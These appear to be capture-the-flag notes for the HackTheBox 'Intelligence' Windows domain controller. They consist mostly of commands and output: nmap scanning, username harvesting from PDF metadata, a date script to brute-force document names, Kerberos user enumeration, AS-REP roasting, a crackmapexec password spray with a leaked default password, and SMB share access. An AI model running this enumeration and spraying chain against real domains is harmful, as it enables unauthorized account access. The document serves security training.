Enumeration
Nmap:
```
nmap -sC -A -T4 10.10.10.248  -oN nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-26 23:02 EDT
Nmap scan report for 10.10.10.248
Host is up (0.18s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-27 10:04:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-27T10:06:19+00:00; +7h01m34s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-27T10:06:19+00:00; +7h01m35s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-27T10:06:19+00:00; +7h01m34s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-27T10:06:17+00:00; +7h01m34s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h01m34s, deviation: 0s, median: 7h01m33s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-10-27T10:05:41
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   184.17 ms 10.10.14.1
2   184.27 ms 10.10.10.248

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.84 seconds
```


```bash
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# ls -la
total 68
drwxr-xr-x  2 root root  4096 Oct 26 23:07 .
drwxr-xr-x 11 root root  4096 Oct 26 23:07 ..
-rw-r--r--  1 root root 26835 Oct 26 23:06 2020-01-01-upload.pdf
-rw-r--r--  1 root root 27242 Oct 26 23:05 2020-12-15-upload.pdf
-rw-r--r--  1 root root  3221 Oct 26 23:04 nmap.txt
```

```bash
exiftool *.pdf
======== 2020-01-01-upload.pdf
ExifTool Version Number : 12.16
File Name : 2020-01-01-upload.pdf
Directory : .
File Size : 26 KiB
File Modification Date/Time : 2021:07:07 05:38:11+00:00
File Access Date/Time : 2021:07:07 05:38:11+00:00
File Inode Change Date/Time : 2021:07:07 05:38:17+00:00
File Permissions : rw-r--r--
File Type : PDF
File Type Extension : pdf
MIME Type : application/pdf
PDF Version : 1.5
Linearized : No
Page Count : 1
Creator : William.Lee
======== 2020-12-15-upload.pdf
ExifTool Version Number : 12.16
File Name : 2020-12-15-upload.pdf
Directory : .
File Size : 27 KiB
File Modification Date/Time : 2021:07:07 05:38:21+00:00
File Access Date/Time : 2021:07:07 05:38:21+00:00
File Inode Change Date/Time : 2021:07:07 05:38:26+00:00
File Permissions : rw-r--r--
File Type : PDF
File Type Extension : pdf
MIME Type : application/pdf
PDF Version : 1.5
Linearized : No
Page Count : 1
Creator : Jose.Williams
2 image files read
```

```bash
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# cat gen_date.sh        
#!/bin/bash
start=2020-1-2
end=2022-01-01
while ! [[ $start > $end ]]; do
echo $start
start=$(date -d "$start + 1 day" +%F)
done


```


```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# pdfgrep 'pass' *.pdf                                                                                        127 ⨯
2020-06-04-upload.pdf:Please login using your username and the default password of:
2020-06-04-upload.pdf:After logging in please change your password as soon as possible.
```

```bash
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# bash gen_date.sh > dates.txt && cat dates.txt | while read line; do echo ${line}$string-upload.pdf; done > file_name.txt 
```


```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# ./kerbrute_linux_amd64 userenum users.txt -d intelligence.htb --dc intelligence.htb 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/27/21 - Ronnie Flathers @ropnop

2021/10/27 00:07:33 >  Using KDC(s):
2021/10/27 00:07:33 >  	intelligence.htb:88

2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Daniel.Shelton@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Wilson@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Danny.Matthews@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Brian.Baker@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Mcbride@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Darryl.Harris@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Anita.Roberts@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Brian.Morris@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Reed@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Ian.Duncan@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jose.Williams@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jennifer.Thomas@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 John.Coleman@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jason.Patterson@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jessica.Moody@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Kelly.Long@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Nicole.Brock@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jason.Wright@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Kaitlyn.Zimmerman@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Richard.Williams@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Scott.Scott@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Thomas.Hall@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Stephanie.Young@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Samuel.Richardson@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Veronica.Patel@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 William.Lee@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Travis.Evans@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Tiffany.Molina@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Thomas.Valenzuela@intelligence.htb
2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Teresa.Williamson@intelligence.htb
2021/10/27 00:07:33 >  Done! Tested 30 usernames (30 valid) in 0.588 seconds
```

```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# python3 GetNPUsers.py intelligence.htb/ -usersfile users.txt                                                127 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set

```

```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# crackmapexec smb intelligence.htb -u users.txt -p 'NewIntelligenceCorpUser9876' --shares 
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [+] Enumerated shares
SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT              READ            
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.248    445    DC               Users           READ            
                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
└─# smbclient \\\\intelligence.htb\\Users -U Tiffany.Molina
Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Apr 18 21:20:26 2021
  ..                                 DR        0  Sun Apr 18 21:20:26 2021
  Administrator                       D        0  Sun Apr 18 20:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018
  Default                           DHR        0  Sun Apr 18 22:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018
  Public                             DR        0  Sun Apr 18 20:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021

		3770367 blocks of size 4096. 1462812 blocks available
smb: \> cd Tiffany.Molina
smb: \Tiffany.Molina\> ls
  .                                   D        0  Sun Apr 18 20:51:46 2021
  ..                                  D        0  Sun Apr 18 20:51:46 2021
  AppData                            DH        0  Sun Apr 18 20:51:46 2021
  Application Data                DHSrn        0  Sun Apr 18 20:51:46 2021
  Cookies                         DHSrn        0  Sun Apr 18 20:51:46 2021
  Desktop                            DR        0  Sun Apr 18 20:51:46 2021
  Documents                          DR        0  Sun Apr 18 20:51:46 2021
  Downloads                          DR        0  Sat Sep 15 03:12:33 2018
  Favorites                          DR        0  Sat Sep 15 03:12:33 2018
  Links                              DR        0  Sat Sep 15 03:12:33 2018
  Local Settings                  DHSrn        0  Sun Apr 18 20:51:46 2021
  Music                              DR        0  Sat Sep 15 03:12:33 2018
  My Documents                    DHSrn        0  Sun Apr 18 20:51:46 2021
  NetHood                         DHSrn        0  Sun Apr 18 20:51:46 2021
  NTUSER.DAT                        AHn   131072  Wed Oct 27 06:13:31 2021
  ntuser.dat.LOG1                   AHS    86016  Sun Apr 18 20:51:46 2021
  ntuser.dat.LOG2                   AHS        0  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf    AHS    65536  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Apr 18 20:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Apr 18 20:51:46 2021
  ntuser.ini                        AHS       20  Sun Apr 18 20:51:46 2021
  Pictures                           DR        0  Sat Sep 15 03:12:33 2018
  Recent                          DHSrn        0  Sun Apr 18 20:51:46 2021
  Saved Games                         D        0  Sat Sep 15 03:12:33 2018
  SendTo                          DHSrn        0  Sun Apr 18 20:51:46 2021
  Start Menu                      DHSrn        0  Sun Apr 18 20:51:46 2021
  Templates                       DHSrn        0  Sun Apr 18 20:51:46 2021
  Videos                             DR        0  Sat Sep 15 03:12:33 2018

		3770367 blocks of size 4096. 1462812 blocks available
smb: \Tiffany.Molina\> cd Desktop
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Sun Apr 18 20:51:46 2021
  ..                                 DR        0  Sun Apr 18 20:51:46 2021
  user.txt                           AR       34  Wed Oct 27 06:04:01 2021

		3770367 blocks of size 4096. 1462812 blocks available
smb: \Tiffany.Molina\Desktop\> cat user.txt
cat: command not found
smb: \Tiffany.Molina\Desktop\> more user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as /tmp/smbmore.nA33pC (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Tiffany.Molina\Desktop\> 
```
